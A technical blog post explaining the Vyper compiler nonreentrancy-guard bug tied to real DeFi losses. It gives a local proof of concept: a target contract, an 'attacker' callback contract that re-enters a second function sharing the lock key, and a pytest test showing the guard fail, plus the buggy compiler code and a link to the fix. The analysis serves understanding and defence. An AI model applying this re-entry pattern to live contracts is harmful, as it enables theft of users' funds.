# Exploring the Vyper Compiler Nonreentrancy Guard Bug

Recently, a bug was discovered in the Vyper compiler that allowed functions decorated with `@nonreentrant` to be called multiple times within the same transaction. This bug, known to exist between versions 0.2.15 to 0.3.0, has led to significant losses for multiple DeFi players. Detailed discussions of the hacks can be found on [rekt.news](https://rekt.news/curve-vyper-rekt/). One such transaction is [here](https://etherscan.io/tx/0xa84aa065ce61dbb1eb50ab6ae67fc31a9da50dd2c74eefd561661bfce2f1620c), where the hacker exploited the bug in a Swap contract at [this address](https://etherscan.io/token/0x9848482da3ee3076165ce6497eda906e66bb85c5#code).

In this blog post, I will modify a test in the Vyper repository to demonstrate this bug.

## Understanding the Nonreentrancy Guard

> According to the [Vyper documentation](https://docs.vyperlang.org/en/v0.1.0-beta.17/structure-of-a-contract.html#non-reentrant-functions), the `@nonreentrant(<key>)` decorator places a lock on the current function and all functions with the same `<key>` value. Any attempt by an external contract to call back into any of these functions will cause a REVERT call.

From this documentation, it's clear that multiple functions with the same `@nonreentrant("some_key")` decorator should be prevented from calling each other in one transaction. However, we'll demonstrate that this is not the case.

## Installing Vyper Locally

First, we clone the Vyper repository and install it locally. We use the `-e` option from pip to install it in editable mode, allowing us to easily switch Vyper versions used in Python.

```bash
git clone git@github.com:vyperlang/vyper.git
git checkout v0.2.15
pip install -e .
```

## Modifying and Running the Test

We'll copy test contracts from [test_nonreentrant.py](https://github.com/vyperlang/vyper/blob/v0.2.15/tests/parser/features/decorators/test_nonreentrant.py) to create our own test cases.

First, we create the target contract `target.vy`:

```python
interface Callback:
    def updated(): nonpayable
    def updated_protected(): nonpayable

special_value: public(String[100])
callback: public(Callback)

@external
def set_callback(c: address):
    self.callback = Callback(c)

event Message:
    text: String[100]
    addr: indexed(address)

@external
@nonreentrant('protect_special_value')
def protected_function(val: String[100], do_callback: bool) -> uint256:
    self.special_value = val

    if do_callback:
        self.callback.updated_protected()
        return 1
    else:
        return 2

@external
def unprotected_function(val: String[100], do_callback: bool):
    self.special_value = val

    if do_callback:
        self.callback.updated()

@external
@nonreentrant('protect_special_value')
def another_protected_function(val: String[100], do_callback: bool) -> uint256:
    self.special_value = val

    if do_callback:
        self.callback.updated_protected()
        return 1
    else:
        return 2
```

Next, we create the caller contract `caller.vy` as the attacker contract,

```python
interface SpecialContract:
    def unprotected_function(val: String[100], do_callback: bool): nonpayable
    def protected_function(val: String[100], do_callback: bool): nonpayable
    def special_value() -> String[100]: nonpayable

@external
def updated():
    SpecialContract(msg.sender).unprotected_function('surprise!', False)

@external
def updated_protected():
    SpecialContract(msg.sender).protected_function('surprise protected!', False)  # This should fail.  # noqa: E501
```

A brief explanation: the `caller` contract has two functions `updated` and `updated_protected` that call the `unprotected_function` and `protected_function` of the `target` contract respectively.

- We can create a transaction which calls `target.unprotected_function(some_value,True)` to modify the value of `special_value`. By using reentrancy call, we can re-enter the same function `unprotected_function` and change the value of `special_value` again. This is a typical re-entrancy scenario.
- Because of the decoration `@nonreentrant('protect_special_value')`, we couldn't do the same for the function `target.protected_function`.
- However, we can call `target.protected_function(some_value,True)` from the callback inside `target.another_protected_function(some_value,True)` in the same transaction. This leads to a mutual call between `target.protected_function` and `target.another_protected_function` in the same transaction, which is not supposed to happen by the reentrancy guard.

Finally, we create the test case `test-contract.py`,

```python
import unittest
from web3 import Web3
from eth_tester import EthereumTester, PyEVMBackend
from vyper import compile_code
import pytest


class TestContract(unittest.TestCase):
    def get_contract(self, source_path):
        with open(source_path, 'r') as file:
            source_path = file.read()
        compiled_contract = compile_code(source_path, ['abi', 'bytecode'])

        Contract = self.w3.eth.contract(abi=compiled_contract['abi'], bytecode=compiled_contract['bytecode'])
        tx_hash = Contract.constructor().transact()
        tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash)
        return self.w3.eth.contract(address=tx_receipt['contractAddress'], abi=compiled_contract['abi'])

    def setUp(self):
        self.eth_tester = EthereumTester(backend=PyEVMBackend())
        self.w3 = Web3(Web3.EthereumTesterProvider(self.eth_tester))

        self.caller = self.get_contract("caller.vy")
        self.target = self.get_contract("target.vy")
        print(f"Target address: {self.target.address}")
        print(f"Caller address: {self.caller.address}")

    def test_hello(self):
        self.target.functions.set_callback(self.caller.address).transact()
        assert self.target.functions.callback().call() == self.caller.address

        print(f"Caller address: {self.caller.address}")

        tx_hash = self.target.functions.unprotected_function("some value", True).transact()
        tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash)
        logs = self.target.events.Message().processReceipt(tx_receipt)
        for log in logs:
            print(f"Event Message: {log['args']}")

        assert self.target.functions.special_value().call() == "surprise!"

        self.target.functions.protected_function("some value", False).transact()
        assert self.target.functions.special_value().call() == "some value"

        self.target.functions.protected_function("a

 value", False).transact()
        assert self.target.functions.special_value().call() == "a value"

        self.target.functions.another_protected_function("b value", False).transact()
        assert self.target.functions.special_value().call() == "b value"

        reverted = False
        try:
            self.target.functions.protected_function("zzz value", True).transact()
            reverted = False
        except Exception as e:
            reverted = True

        assert reverted, "protected_function Should have reverted"

        try:
            self.target.functions.another_protected_function("mmm value", True).transact()
            reverted = False
            print("Value of special_value now is:", self.target.functions.special_value().call())
        except Exception as e:
            reverted = True

        assert reverted, "another protected_function Should have failed"


if __name__ == '__main__':
    unittest.main()
```

To run the test, use the command:

```bash
pytest test-contract.py
```

We can see the test failed and the `special_value` is changed to `surprise protected!`,

```text
Value of special_value now is: surprise protected!
```

Using the same test, we can test other Vyper versions by checking out different tags in the Vyper repository. For example, to check if version `0.3.1` still has the bug, we can do:

```bash
# From Vyper directory
git checkout v0.3.1
```

Then run the test again. Now, you should see all the tests pass.

# Could this happen to Solidity?

Vyper provides reentrancy guard natively at the compiler level. However Solidity does not have such functionality. It's common practice to use the [Openzeppelin Reentrancy Guard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) which is unlike vyper which have fine grained locks, openzellin uses a global contract level lock. So theoretically, this bug should not happen to Solidity contracts as well.

# Where is the bug exactly?

If you are wondering where exactly is the bug located, it's [here](https://github.com/vyperlang/vyper/blob/v0.2.15/vyper/semantics/validation/data_positions.py#L35). I've copied the function below for your convenience. The bug is that the `storage_slot` is incremented for every function, even if the function is are decorated with the same reentrancy key.

```py
def set_storage_slots(vyper_module: vy_ast.Module) -> None:
    """
    Parse module-level Vyper AST to calculate the layout of storage variables.
    """
    # Allocate storage slots from 0
    # note storage is word-addressable, not byte-addressable
    storage_slot = 0

    for node in vyper_module.get_children(vy_ast.FunctionDef):
        type_ = node._metadata["type"]
        if type_.nonreentrant is not None:
            type_.set_reentrancy_key_position(StorageSlot(storage_slot))
            # TODO use one byte - or bit - per reentrancy key
            # requires either an extra SLOAD or caching the value of the
            # location in memory at entrance
            storage_slot += 1

    for node in vyper_module.get_children(vy_ast.AnnAssign):
        type_ = node.target._metadata["type"]
        type_.set_position(StorageSlot(storage_slot))
        # CMC 2021-07-23 note that HashMaps get assigned a slot here.
        # I'm not sure if it's safe to avoid allocating that slot
        # for HashMaps because downstream code might use the slot
        # ID as a salt.
        storage_slot += math.ceil(type_.size_in_bytes / 32)
```

A fix can be found [here](https://github.com/vyperlang/vyper/pull/2439/files#diff-bbb2d32046e0a730536ca9e7d0b871e3765826115fc9f0c0228ddf08f171dde6R40-R43).
